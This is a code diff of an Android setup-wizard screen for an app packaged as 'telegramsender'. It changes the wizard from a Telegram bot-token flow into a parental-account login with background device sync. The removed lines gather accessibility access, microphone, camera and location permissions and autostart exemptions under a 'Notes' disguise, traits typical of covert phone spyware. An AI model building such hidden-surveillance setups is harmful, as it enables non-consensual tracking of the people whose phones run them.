@@ -2,67 +2,66 @@ package com.example.telegramsender.ui
 
 import android.content.Context
 import android.content.Intent
-import android.content.SharedPreferences
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.lifecycle.lifecycleScope
 import com.example.telegramsender.MainActivity
 import com.example.telegramsender.R
+import com.example.telegramsender.data.DevicePreferences
+import com.example.telegramsender.network.ApiClient
+import com.example.telegramsender.worker.SyncScheduler
 import com.google.android.material.button.MaterialButton
 import com.google.android.material.textfield.TextInputEditText
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 
 class SetupWizardActivity : AppCompatActivity() {
 
     private var currentStep = 1
-    private lateinit var pref: SharedPreferences
 
     private lateinit var stepText: TextView
     private lateinit var btnNext: MaterialButton
 
     private lateinit var stepWelcome: View
-    private lateinit var stepTelegram: View
-    private lateinit var stepAccessibility: View
+    private lateinit var stepLogin: View
     private lateinit var stepPermissions: View
-    private lateinit var stepBattery: View
     private lateinit var stepDone: View
 
-    private lateinit var wizardBotToken: TextInputEditText
-    private lateinit var wizardChatId: TextInputEditText
+    private lateinit var wizardEmail: TextInputEditText
+    private lateinit var wizardPassword: TextInputEditText
+    private lateinit var wizardErrorText: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_setup_wizard)
-        pref = getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
 
         stepText = findViewById(R.id.stepText)
         btnNext = findViewById(R.id.btnNext)
 
         stepWelcome = findViewById(R.id.stepWelcome)
-        stepTelegram = findViewById(R.id.stepTelegram)
-        stepAccessibility = findViewById(R.id.stepAccessibility)
+        stepLogin = findViewById(R.id.stepLogin)
         stepPermissions = findViewById(R.id.stepPermissions)
-        stepBattery = findViewById(R.id.stepBattery)
         stepDone = findViewById(R.id.stepDone)
 
-        wizardBotToken = findViewById(R.id.wizardBotToken)
-        wizardChatId = findViewById(R.id.wizardChatId)
+        wizardEmail = findViewById(R.id.wizardEmail)
+        wizardPassword = findViewById(R.id.wizardPassword)
+        wizardErrorText = findViewById(R.id.wizardErrorText)
 
-        findViewById<MaterialButton>(R.id.btnWizardAccessibility).setOnClickListener {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-        }
-
-        findViewById<MaterialButton>(R.id.btnWizardPermissions).setOnClickListener {
-            requestPermissions(arrayOf(
-                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                android.Manifest.permission.RECORD_AUDIO,
-                android.Manifest.permission.CAMERA
-            ), 100)
+        findViewById<MaterialButton>(R.id.btnWizardLocation).setOnClickListener {
+            requestPermissions(
+                arrayOf(
+                    android.Manifest.permission.ACCESS_FINE_LOCATION,
+                    android.Manifest.permission.ACCESS_COARSE_LOCATION
+                ),
+                101
+            )
         }
 
         findViewById<MaterialButton>(R.id.btnWizardBattery).setOnClickListener {
@@ -70,7 +69,7 @@ class SetupWizardActivity : AppCompatActivity() {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                     startActivity(intent)
-                    Toast.makeText(this, "Find 'Notes' -> 'No Restrictions'", Toast.LENGTH_LONG).show()
+                    Toast.makeText(this, "Find app and select 'Don't Optimize'", Toast.LENGTH_LONG).show()
                 } else {
                     startActivity(Intent(Settings.ACTION_SETTINGS))
                 }
@@ -79,91 +78,109 @@ class SetupWizardActivity : AppCompatActivity() {
             }
         }
 
-        findViewById<MaterialButton>(R.id.btnWizardAutostart).setOnClickListener {
-            // Try to open Xiaomi Autostart if detected, or generic app settings
-            try {
-                val intent = Intent()
-                intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
-                startActivity(intent)
-            } catch (e: Exception) {
-                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                intent.data = Uri.parse("package:$packageName")
-                startActivity(intent)
-            }
-        }
-
         btnNext.setOnClickListener {
-            goToNextStep()
+            handleNextAction()
         }
 
         updateStepVisibility()
     }
 
-    private fun goToNextStep() {
+    private fun handleNextAction() {
         when (currentStep) {
-            1 -> currentStep = 2 // Welcome -> Telegram
+            1 -> {
+                currentStep = 2 // Go to Login / Register
+                updateStepVisibility()
+            }
             2 -> {
-                // Validate Telegram
-                val token = wizardBotToken.text.toString().trim()
-                val chat = wizardChatId.text.toString().trim()
-                if (token.isEmpty() || chat.isEmpty()) {
-                    Toast.makeText(this, "Please enter connection details", Toast.LENGTH_SHORT).show()
+                val email = wizardEmail.text.toString().trim()
+                val password = wizardPassword.text.toString().trim()
+
+                if (email.isEmpty() || password.isEmpty()) {
+                    wizardErrorText.visibility = View.VISIBLE
+                    wizardErrorText.text = "Please enter both email and password"
                     return
                 }
-                pref.edit().putString("token", token).putString("chatId", chat).apply()
-                currentStep = 3
+
+                wizardErrorText.visibility = View.GONE
+                btnNext.isEnabled = false
+                btnNext.text = "CONNECTING..."
+
+                lifecycleScope.launch(Dispatchers.IO) {
+                    val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+                    val result = ApiClient.registerDevice(
+                        email = email,
+                        password = password,
+                        deviceName = deviceName,
+                        deviceModel = Build.MODEL,
+                        appVersion = "1.0.0"
+                    )
+
+                    withContext(Dispatchers.Main) {
+                        btnNext.isEnabled = true
+                        if (result.success && result.deviceJwt != null && result.deviceId != null) {
+                            // Save pairing info
+                            DevicePreferences.saveRegistration(
+                                context = this@SetupWizardActivity,
+                                jwt = result.deviceJwt,
+                                deviceId = result.deviceId,
+                                deviceToken = result.deviceToken ?: "",
+                                parentEmail = email,
+                                deviceName = deviceName,
+                                intervalMinutes = result.syncIntervalMinutes
+                            )
+
+                            // Start background sync scheduler
+                            SyncScheduler.schedulePeriodicSync(this@SetupWizardActivity, result.syncIntervalMinutes)
+                            SyncScheduler.triggerImmediateSync(this@SetupWizardActivity)
+
+                            currentStep = 3 // Go to Permissions
+                            updateStepVisibility()
+                        } else {
+                            btnNext.text = "CONNECT ACCOUNT"
+                            wizardErrorText.visibility = View.VISIBLE
+                            wizardErrorText.text = result.errorMessage ?: "Authentication failed. Check credentials."
+                        }
+                    }
+                }
             }
-            3 -> currentStep = 4 // Telegram -> Accessibility
-            4 -> currentStep = 5 // Accessibility -> Permissions
-            5 -> currentStep = 6 // Permissions -> Battery
-            6 -> {
-                pref.edit().putBoolean("setup_complete", true).apply()
+            3 -> {
+                currentStep = 4 // Go to Done
+                updateStepVisibility()
+            }
+            4 -> {
+                // Complete setup and launch MainActivity
                 startActivity(Intent(this, MainActivity::class.java))
                 finish()
-                return
             }
         }
-        updateStepVisibility()
     }
 
     private fun updateStepVisibility() {
         stepWelcome.visibility = View.GONE
-        stepTelegram.visibility = View.GONE
-        stepAccessibility.visibility = View.GONE
+        stepLogin.visibility = View.GONE
         stepPermissions.visibility = View.GONE
-        stepBattery.visibility = View.GONE
         stepDone.visibility = View.GONE
 
         when (currentStep) {
             1 -> {
                 stepWelcome.visibility = View.VISIBLE
-                stepText.text = "Step 1/6"
+                stepText.text = "Step 1/4"
                 btnNext.text = "GET STARTED"
             }
             2 -> {
-                stepTelegram.visibility = View.VISIBLE
-                stepText.text = "Step 2/6"
-                btnNext.text = "CONNECT"
+                stepLogin.visibility = View.VISIBLE
+                stepText.text = "Step 2/4"
+                btnNext.text = "CONNECT ACCOUNT"
             }
             3 -> {
-                stepAccessibility.visibility = View.VISIBLE
-                stepText.text = "Step 3/6"
-                btnNext.text = "NEXT"
+                stepPermissions.visibility = View.VISIBLE
+                stepText.text = "Step 3/4"
+                btnNext.text = "CONTINUE"
             }
             4 -> {
-                stepPermissions.visibility = View.VISIBLE
-                stepText.text = "Step 4/6"
-                btnNext.text = "NEXT"
-            }
-            5 -> {
-                stepBattery.visibility = View.VISIBLE
-                stepText.text = "Step 5/6"
-                btnNext.text = "NEXT"
-            }
-            6 -> {
                 stepDone.visibility = View.VISIBLE
                 stepText.text = "Complete"
-                btnNext.text = "FINISH"
+                btnNext.text = "GO TO DASHBOARD"
             }
         }
     }
